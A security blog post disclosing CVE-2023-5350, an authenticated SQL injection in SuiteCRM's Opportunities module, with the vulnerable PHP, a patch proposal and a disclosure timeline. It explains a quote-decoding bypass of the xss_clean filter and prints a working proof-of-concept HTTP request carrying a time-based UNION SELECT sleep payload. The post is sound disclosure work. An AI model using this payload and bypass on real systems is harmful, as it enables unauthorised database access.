<!DOCTYPE html>







<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="CVE-2023-5350 - SuiteCRM &lt; v7.14.0 authenticated SQL injection" />
<meta property="og:locale" content="en" />
<meta name="description" content="TL;DR" />
<meta property="og:description" content="TL;DR" />
<link rel="canonical" href="https://big5-sec.github.io/posts/cve-2023-5350-SuiteCRM-SQLi/" />
<meta property="og:url" content="https://big5-sec.github.io/posts/cve-2023-5350-SuiteCRM-SQLi/" />
<meta property="og:site_name" content="yar-eb" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-01-11T02:50:40+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2023-5350 - SuiteCRM &lt; v7.14.0 authenticated SQL injection" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-01-11T02:50:40+01:00","datePublished":"2024-01-11T02:50:40+01:00","description":"TL;DR","headline":"CVE-2023-5350 - SuiteCRM &lt; v7.14.0 authenticated SQL injection","mainEntityOfPage":{"@type":"WebPage","@id":"https://big5-sec.github.io/posts/cve-2023-5350-SuiteCRM-SQLi/"},"url":"https://big5-sec.github.io/posts/cve-2023-5350-SuiteCRM-SQLi/"}</script>
<!-- End Jekyll SEO tag -->


  <title>CVE-2023-5350 - SuiteCRM < v7.14.0 authenticated SQL injection | yar-eb
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="yar-eb">
<meta name="application-name" content="yar-eb">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        
        <img src="
        
        /assets/avatar.jpg
        
        " alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">yar-eb</a>
    </div>
    <div class="site-subtitle font-italic">Yet another reverse-engineer blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>

    <!-- the real tabs -->
    


  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    <!--  -->

    
    

    
    <a href="https://github.com/Big5-sec" aria-label="github" target="_blank" rel="noopener" >
      <i class="fab fa-github"></i>
    </a>
    

    
    

    
    <a href="/feed.xml" aria-label="rss" >
      <i class="fas fa-rss"></i>
    </a>
    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->

    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>CVE-2023-5350 - SuiteCRM < v7.14.0 authenticated SQL injection</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        



<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->







<h1 data-toc-skip>CVE-2023-5350 - SuiteCRM < v7.14.0 authenticated SQL injection</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <!-- <div>
    
    

    

    By
    <em>
      
        <a href="https://github.com/Big5-sec">Zilio Nicolas</a>
      
    </em>
  </div> -->

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago"
    data-ts="1704937840"
    
      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
    
    >
  2024-01-11
</em>

      </span>

      <!-- lastmod date -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="546 words" style="vertical-align: sub;">
  <em>3 min</em> read</span>


      <!-- page views -->
      <!--  -->
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <h1 id="tldr">TL;DR</h1>

<p>Authenticated SQL injection affecting the <code class="language-plaintext highlighter-rouge">Opportunities</code> module of SuiteCRM for versions prior to 7.14.0</p>

<h1 id="details">Details</h1>

<p>At CrowdStrike, following claims from a threat actor to have hacked SuiteCRM at multiple entities using a SQL injection, I started a little audit of SuiteCRM to uncover whether the threat was realistic or not. Upon research, I stumbled on the <code class="language-plaintext highlighter-rouge">modules/Opportunities/Save.php</code> file, in which we can find the following code:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="k">require_once</span><span class="p">(</span><span class="s1">'modules/Opportunities/OpportunityFormBase.php'</span><span class="p">);</span>
<span class="nv">$opportunityForm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OpportunityFormBase</span><span class="p">();</span>
<span class="nv">$opportunityForm</span><span class="o">-&gt;</span><span class="nf">handleSave</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="kc">true</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">handleSave</code> function may end up calling the <code class="language-plaintext highlighter-rouge">clone_relationship</code> function, using the <code class="language-plaintext highlighter-rouge">duplicate_parent_id</code> <code class="language-plaintext highlighter-rouge">POST</code> variable as 4th argument:</p>

<p><img data-src="/assets/img/2024-01-11-cve-2023-5350-SuiteCRM-SQLi/code1.png" alt="code1" data-proofer-ignore></p>

<p>Within the <code class="language-plaintext highlighter-rouge">clone_relationship</code> function, a SQL query is created with this 4th argument, that could lead to SQL injection:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">clone_relationship</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$tables</span><span class="p">,</span> <span class="nv">$from_column</span> <span class="o">=</span> <span class="kc">null</span><span class="p">,</span> <span class="nv">$from_id</span> <span class="o">=</span> <span class="kc">null</span><span class="p">,</span> <span class="nv">$to_id</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">[</span><span class="mf">...</span><span class="p">]</span>
            <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM </span><span class="nv">$table</span><span class="s2"> WHERE </span><span class="nv">$from_column</span><span class="s2">='</span><span class="nv">$from_id</span><span class="s2">'"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$results</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
    <span class="p">[</span><span class="mf">...</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>At that point, several security measures prevent direct exploitation of this SQL injection:</p>
<ul>
  <li>The <code class="language-plaintext highlighter-rouge">Save.php</code> file cannot be accessed directly due to a <code class="language-plaintext highlighter-rouge">.htaccess</code> directive setting up a <code class="language-plaintext highlighter-rouge">403 unauthorized access</code> on modules directory.</li>
  <li>The <code class="language-plaintext highlighter-rouge">Save.php</code> requires a valid “SugarEntry” entrypoint, that gets defined by going through the <code class="language-plaintext highlighter-rouge">index.php</code> endpoint with the <code class="language-plaintext highlighter-rouge">action=Save</code> and <code class="language-plaintext highlighter-rouge">module=Opportunities</code> parameters. However, doing so, the <code class="language-plaintext highlighter-rouge">POST</code> variables are filtered (quote gets encoded) against basic SQL injection through the use of the <code class="language-plaintext highlighter-rouge">clean_incoming_data</code> function.</li>
</ul>

<p>Yet, the <code class="language-plaintext highlighter-rouge">clean_incoming_data</code> function can be tricked into leaving quotes unencoded, as highlighted by <a href="https://huntr.dev/bounties/8afb7991-c6ed-42d9-bd9b-1cc83418df88/">this previous bounty report</a>. Yet, the inner working of this bypass was not explained.</p>

<p>Typically, the <code class="language-plaintext highlighter-rouge">clean_incoming_data</code> function calls the inner <code class="language-plaintext highlighter-rouge">securexss</code> function on each <code class="language-plaintext highlighter-rouge">$_POST</code> value. This <code class="language-plaintext highlighter-rouge">securexss</code> function first encodes quotes and then calls the <code class="language-plaintext highlighter-rouge">xss_clean</code> function from Voku. This <code class="language-plaintext highlighter-rouge">xss_clean</code> function decodes all characters present in the input string to clean; in order to detect and strip all the javascript related words afterwards. In case a javascript payload is detected by the function, then the cleaned up (and so decoded) string is returned. In case there is no payload detected, then the original string is returned (the encoded one). By integrating <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> in the SQL payload, <code class="language-plaintext highlighter-rouge">xss_clean</code> decodes the string (transform back the encoded quote to a decoded one), detect the attack and remove the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag before returning the string with the decoded quote.</p>

<p>Here is an example request showing SQL injection by triggering a 5 seconds sleep by SuiteCrm application:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>POST /suitecrm/index.php HTTP/1.1

Host: &lt;redacted&gt;
Content-Length: 633
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: &lt;redacted&gt;
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://&lt;redacted&gt;/suitecrm/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: EmailGridWidths=0=10&amp;1=10&amp;2=150&amp;3=250&amp;4=175&amp;5=125; Users_sp_tab=All; Opportunities_sp_tab=All; ck_login_language_20=en_us; ck_login_theme_20=SuiteP; sugar_user_theme=SuiteP; PHPSESSID=7t8i63rduuadi6vg2n5tsemrq9; ck_login_id_20=d1c6197a-c7cf-4d2f-6970-649c44bd341a
Connection: close


module=Opportunities&amp;record=&amp;duplicateSave=true&amp;duplicate_parent_id=1&lt;/script&gt;'%20UNION%20SELECT%20sleep(5),1,2,3,4,5%20--%20-&amp;duplicateId=3005bd81-1904-8e56-d5f5-649d55cc7438&amp;isDuplicate=false&amp;action=Save&amp;return_module=Opportunities&amp;return_action=DetailView&amp;return_id=&amp;module_tab=&amp;contact_role=&amp;offset=1&amp;name=test23&amp;account_name=testaccount&amp;account_id=9bf1efd4-30c2-9e99-067c-649d4e24e2bf&amp;currency_id=-99&amp;date_closed=09%2F07%2F2023&amp;amount=1%2C000%2C000.00&amp;opportunity_type=&amp;sales_stage=Prospecting&amp;lead_source=&amp;probability=10&amp;campaign_name=&amp;campaign_id=&amp;next_step=&amp;description=&amp;assigned_user_name=gg+Administrator&amp;assigned_user_id=1
</pre></td></tr></tbody></table></code></div></div>
<h1 id="proposed-patch">Proposed patch</h1>

<p>The following modifications were proposed to secure the vulnerability:</p>

<ul>
  <li>Use <code class="language-plaintext highlighter-rouge">focus-&gt;db-&gt;quote</code> in front of the <code class="language-plaintext highlighter-rouge">$_POST['duplicate_parent_id']</code> variable in the <code class="language-plaintext highlighter-rouge">clone_relationship</code> call to make sure quotes are escaped <strong>-&gt;</strong> <span style="color:green">implemented (<a href="https://github.com/salesagility/SuiteCRM/commit/bd9328e79f39ad0f49a53f609bfb5e42762b5fd8">commit</a>)</span></li>
  <li>Modify the <code class="language-plaintext highlighter-rouge">securexss</code> function to encode the string after the <code class="language-plaintext highlighter-rouge">xss_clean</code> function call <strong>-&gt;</strong> vendor argued testing was necessary before incorporating this change, which is understandable. Last time I checked it was not implemented.</li>
</ul>

<h1 id="timeline">Timeline</h1>

<p>30 Jun 2023 : initial report
30 Jun 2023 : vendor confirmation
29 Aug 2023 : update available</p>

</div>


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      


















    </div>

    
      
      




    
  </div>

</div>

<!-- tail -->



      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>




  

  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

